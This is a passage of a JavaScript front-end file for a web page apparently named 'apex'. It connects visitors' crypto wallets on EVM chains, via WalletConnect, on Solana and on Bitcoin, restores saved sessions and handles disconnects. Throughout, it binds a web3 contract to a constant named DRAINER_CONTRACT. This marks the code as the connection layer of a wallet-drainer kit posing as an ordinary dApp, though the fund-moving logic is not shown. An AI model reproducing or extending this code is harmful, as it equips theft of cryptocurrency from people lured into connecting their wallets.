            resetConnectedUI();
            clearSavedWallet();
            window.solanaProvider = null;
            window.solanaPublicKey = null;
          }
        });
        provider.on('disconnect', () => {
          resetConnectedUI();
          clearSavedWallet();
          window.solanaProvider = null;
          window.solanaPublicKey = null;
        });
      }
      return true;
    } catch (e) {
      logDebug(`SOL connection error: ${e.message}`);
      showStatus('Solana connection failed: ' + e.message, 'error');
      return false;
    }
  }

  // ============================================================
  //  INJECTED EVM PROVIDER EVENTS (desktop + in-wallet browser)
  // ============================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on || provider.__apexInjectedEvents) return;
    provider.__apexInjectedEvents = true;

    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
        showStatus('Wallet disconnected', 'info');
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], null, 'evm');
      }
    });
    provider.on('chainChanged', (chainId) => {
      showStatus(`Network changed to ${chainId}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });
    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
      showStatus('Wallet disconnected', 'info');
    });
  }

  // ============================================================
  //  MAIN CONNECT DISPATCHER – device-aware (unchanged flow)
  // ============================================================
  async function connectWallet() {
    if (isConnecting) { logDebug('Connection already in progress, please wait'); return; }

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;
    const platform = getPlatform();
    logDebug(`Platform: ${platform} | isMobile: ${isMobile()}`);

    if (isMobile()) {
      // ===== MOBILE PATH – WalletConnect only =====
      logDebug('📱 Mobile: WalletConnect only');
      success = await connectViaWalletConnect(false, 60000);
      if (!success && FALLBACK_ID) {
        logDebug('Mobile: retrying with public test ID');
        success = await connectViaWalletConnect(true, 60000);
      }
      if (!success) {
        showStatus('No wallet found. Please install a WalletConnect-compatible wallet.', 'error');
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
      } else {
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
      }
      return;
    }

    // ===== DESKTOP PATH: Direct EVM → WalletConnect → Solana → Bitcoin =====
    logDebug('🖥️ Desktop: full flow');

    success = await connectDirectEVM(4000);
    if (success) {
      logDebug('✅ Desktop: Direct EVM success');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      return;
    }

    logDebug('Desktop: WalletConnect fallback');
    success = await connectViaWalletConnect(false, 120000);
    if (!success && FALLBACK_ID) success = await connectViaWalletConnect(true, 120000);
    if (success) {
      logDebug('✅ Desktop: WalletConnect success');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      return;
    }

    if (getSolanaWallets().length > 0) {
      success = await connectSolana();
      if (success) {
        logDebug('✅ Desktop: Solana success');
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        return;
      }
    }

    if (window.unisat) {
      success = await connectBitcoin();
      if (success) {
        logDebug('✅ Desktop: Bitcoin success');
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        return;
      }
    }

    logDebug('❌ Desktop: all methods failed');
    showStatus('No supported wallet found. Please install a wallet.', 'error');
    setButtonState(connectButton, 'failed');
    if (walletButton) setButtonState(walletButton, 'failed');
  }

  // ============================================================
  //  DISCONNECT — really kills the WC session
  // ============================================================
  async function disconnectWallet() {
    try {
      if (window.solanaProvider?.disconnect) {
        await window.solanaProvider.disconnect();
      }

      // Tear down the WC signing provider (this is what removes the entry
      // from Trust Wallet's "Connected Apps" list).
      if (wcEthereumProvider?.disconnect) {
        try {
          await Promise.race([
            wcEthereumProvider.disconnect(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
          ]);
        } catch (e) { logDebug('WC disconnect: ' + e.message); }
      }

      if (client && currentSession) {
        try {
          await client.disconnect({
            topic: currentSession.topic,
            reason: { code: 6000, message: 'User disconnected' },
          });
        } catch (e) { logDebug('client.disconnect: ' + e.message); }
        currentSession = null;
      }

      if (injectedProvider?.request) {
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          }).catch(() => {});
        } catch {}
      }
    } catch (err) {
      logDebug(`Disconnect error: ${err.message}`);
    }

    resetConnectedUI();
    clearSavedWallet();
    window.solanaProvider = null;
    window.solanaPublicKey = null;
    web3Instance = null;
    contractInstance = null;
    wcEthereumProvider = null;
    injectedProvider = null;
    activeProvider = null;
    connectionMode = null;
  }

  // ============================================================
  //  BUTTON CLICK HANDLER
  // ============================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const isConnected = !!activeProvider || !!window.__apexConnected?.address || !!saved;
    if (isConnected) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton) walletButton.addEventListener('click', handleClick);

  // ============================================================
  //  RESTORE SESSION (PC and Mobile)  — same shape as old flow,
  //  but rehydrates signing provider via EthereumProvider.init({session})
  // ============================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain  = getSavedChainType();
    const savedSession = getSavedSession();

    // Handle pending WC deeplink return
    const pendingUri = sessionStorage.getItem('pending_wc_uri');
    const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp');
    if (pendingUri && pendingTimestamp) {
      const elapsed = Date.now() - parseInt(pendingTimestamp);
      if (elapsed < 120000 && client) {
        logDebug('Checking for pending session after return…');
        try {
          const sessions = client.session.values();
          if (sessions.length > 0) {
            const session = sessions[0];
            const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
            if (account) {
              await adoptSession(session, account);
              sessionStorage.removeItem('pending_wc_uri');
              sessionStorage.removeItem('pending_wc_timestamp');
              return;
            }
          }
        } catch (e) {
          logDebug(`Pending session restore failed: ${e.message}`);
        }
      }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
    }

    if (!savedWallet || savedChain === 'unknown') return;

    logDebug(`♻️ Restoring ${savedChain} wallet: ${savedWallet}`);

    if (savedChain === 'evm') {
      // --- WC session restore ---
      if (savedSession && savedSession.topic) {
        const initSuccess = await initWalletConnect(false);
        if (initSuccess) {
          try {
            const session = client.session.get(savedSession.topic);
            if (session) {
              await adoptSession(session, savedWallet);
              return;
            }
          } catch (e) { logDebug(`Session restore failed: ${e.message}`); }
        }
      }
      // --- Injected restore (desktop only) ---
      if (isDesktop() && window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' }).catch(() => []);
          if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = window.ethereum;
            activeProvider = window.ethereum;
            connectionMode = 'injected';

            const Web3 = (await import('web3')).default;
            web3Instance = new Web3(window.ethereum);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            setupEVMProviderEvents(window.ethereum);
            updateConnectedUI(savedWallet, 'evm');
            return;
          }
        } catch (e) { logDebug('Injected restore: ' + e.message); }
      }
      clearSavedWallet();
    } else if (savedChain === 'solana') {
      if (isDesktop() && window.solana && window.solana.publicKey) {
        const addr = window.solana.publicKey.toString();
        if (addr === savedWallet) {
          connectionMode = 'solana';
          updateConnectedUI(savedWallet, 'solana');
          window.solanaPublicKey = addr;
          window.solanaProvider = window.solana;
          return;
        }
      }
      if (isDesktop()) {
        const ok = await connectSolana();
        if (ok) return;
      }
      clearSavedWallet();
    } else if (savedChain === 'bitcoin') {
      if (isDesktop() && window.unisat) {
        try {
          const accounts = await window.unisat.getAccounts();
          if (accounts.length > 0 && accounts[0] === savedWallet) {
            connectionMode = 'bitcoin';
            updateConnectedUI(savedWallet, 'bitcoin');
            return;
          }
        } catch (e) {}
      }
      clearSavedWallet();
    }
  }

  /**
   * Given a WC session, create the live signing provider and update state.
   * Used both during connect and during restore.
   */
  async function adoptSession(session, account) {
    currentSession = session;

    let signProvider = null;
    try {
      signProvider = await EthereumProvider.init({
        projectId,
        chains: [MAINNET_ID],
        optionalChains: [MAINNET_ID],
        showQrModal: false,
        metadata: DAPP_METADATA,
        session,
        rpcMap: { [MAINNET_ID]: 'https://cloudflare-eth.com' },
      });
    } catch (e) {
      logDebug(`adoptSession EthereumProvider.init: ${e.message}`);
      return false;
    }

    wcEthereumProvider = signProvider;
    activeProvider = signProvider;
    connectionMode = 'walletconnect';

    const Web3 = (await import('web3')).default;
    web3Instance = new Web3(signProvider);
    contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

    saveWallet(account, session, 'evm');
    attachWCProviderEvents(signProvider);
    attachClientSessionEvents();

    updateConnectedUI(account, 'evm');
    logDebug(`♻️ Session adopted: ${account}`);
    return true;
  }

  // ============================================================
  //  LOAD LIBRARIES AND START
  // ============================================================
  try {
    const libs = await loadWalletConnect();
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;
    logDebug('✅ All libraries loaded');

    setupEIP6963();

    // Attach client events immediately so session_connect / session_delete
    // are caught even before the user clicks Connect.
    attachClientSessionEvents();

    await restoreWalletConnection();
  } catch (err) {
    logDebug(`❌ Fatal error: ${err.message}`);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ============================================================
  //  GLOBAL EVM PROVIDER EVENTS (if already set up)
  // ============================================================
  if (window.ethereum && isDesktop()) {
    setupEVMProviderEvents(window.ethereum);
  }

  // ============================================================
  //  VISIBILITY CHANGE – check for pending session return
  //  (this is the critical path when Trust Wallet bounces the user back)
  // ============================================================
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) return;
    const pendingUri = sessionStorage.getItem('pending_wc_uri');
    const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp');
    if (!pendingUri || !pendingTimestamp) return;

    const elapsed = Date.now() - parseInt(pendingTimestamp);
    if (elapsed >= 120000 || !client) return;

    logDebug('Visibility change: checking for pending session…');
    setTimeout(async () => {
      try {
        const sessions = client.session.values();
        if (sessions.length > 0) {
          const session = sessions[0];
          const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
          if (account) {
            await adoptSession(session, account);
            sessionStorage.removeItem('pending_wc_uri');
            sessionStorage.removeItem('pending_wc_timestamp');
          }
        }
      } catch (e) {
        logDebug(`Visibility check session restore failed: ${e.message}`);
      }
    }, 1000);
  });

  // ============================================================
  //  CLEANUP
  // ============================================================
  window.addEventListener('beforeunload', () => {
    if (modal) { try { modal.closeModal(); } catch {} }
  });

  // ============================================================
  //  EXPOSE
  // ============================================================
  window.apexConnect    = connectWallet;
  window.apexDisconnect = disconnectWallet;

  logDebug(`✅ main.js fully initialised – device‑aware, fast connection flow`);
  logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`);
  logDebug(`   Flow: ${isMobile() ? 'WalletConnect only (modal)' : 'Direct EVM (4s) → WalletConnect → Solana → Bitcoin'}`);
})();
